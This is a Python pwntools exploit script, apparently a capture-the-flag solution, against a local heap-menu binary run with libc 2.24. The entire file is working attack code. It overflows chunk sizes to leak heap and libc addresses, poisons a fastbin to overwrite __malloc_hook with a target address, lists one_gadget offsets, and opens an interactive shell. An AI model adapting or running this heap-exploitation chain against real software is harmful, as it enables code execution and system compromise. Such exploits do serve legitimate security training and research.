from pwn import *


r=process("./64",env={"LD_PRELOAD": "./libc-2.24.so"})
libc=ELF("libc-2.24.so")
#gdb.attach(r)
#pause()
def add():
        r.sendline("1")
        r.recvuntil("$ ")


def input(num,lenn,content):
        r.sendline("3")
        r.recvuntil("?\n")
        r.sendline(str(num))
        r.recvuntil(":")
        sleep(0.1)
        r.sendline(str(lenn))
        r.recvuntil(">>\n")
        r.send(content)
        r.recvuntil("$ ")


def free(num):
        r.sendline("4")
        r.recvuntil("?\n")
        r.sendline(str(num))
        r.recvuntil("$ ")

r.recvuntil(" : ")
gift=r.recvuntil("\n")
gift=gift[:-1]
gift=int(gift,16)
gift=gift-0xE9A
gift=gift+0x000000000000A70
r.recvuntil("$ ")
#allocate 10 block
for i in range(10):
        add()


free(9)
#extend chunk 1
#original is 0x50
input(0,73,"A"*72+"z")

free(2)

input(1,100,"Q"*72+"X"*8)
log.info("Leaking heap ")

r.sendline("2")
r.recvuntil("?\n")
r.sendline("1")
r.recvuntil("XXXXXXXX")
leak=r.recvuntil("\n")
leak=u64(leak[:-1].ljust(8,"\x00"))
print "leaked heap : "+hex(leak)

#recover
input(1,100,"Q"*72+p64(0x51))
add()
add()#old 9

input(5,73,"A"*72+"z")

input(6,100,"Q"*72+p64(0xa1))
free(7)
input(6,100,"Q"*72+"X"*8)
log.info("Leaking Libc ")
r.sendline("2")
r.recvuntil("?\n")
r.sendline("6")
r.recvuntil("XXXXXXXX")
leak=r.recvuntil("\n")
leak=u64(leak[:-1].ljust(8,"\x00"))
print "leaked Libc : "+hex(leak)

#offset=free-leak
offset=0x7f04c842b920-0x7f04c877cb58
#offset=0x7f1f4b1a6690-0x7f1f4b4fbb78
puts=offset+leak
print "puts "+hex(puts)
libc_base=puts-libc.symbols['puts']
malloc_hook=libc_base+libc.symbols['__malloc_hook']
print "malloc hook "+hex(malloc_hook)
input(6,100,"Q"*72+p64(0x51))
input(6,100,"Q"*40+p64(0x21))

#build a fake fastbin to suck the hole
input(5,73,"A"*72+"\x31")
free(6)

input(0,73,"A"*72+"z")
free(2)
input(1,100,"X"*72+p64(0x51)+p64(malloc_hook+0x20-8+5))
add()
add()
#control the top chunk
payload="\x00"*(59)+p64(malloc_hook-35)
input(6,80,payload)
add()
add()# malloc_hook

print "Position of malloc hook -35 : "+hex(malloc_hook-35)
#hijacking malloc hook
#0x45216,0x4526a,0xf02a4,0xf1147
one=libc_base+0xf1147
gdb.attach(r)

input(10,50,"Q"*19+p64(gift))
r.sendline("1")
r.sendline("ls -al")
r.interactive()

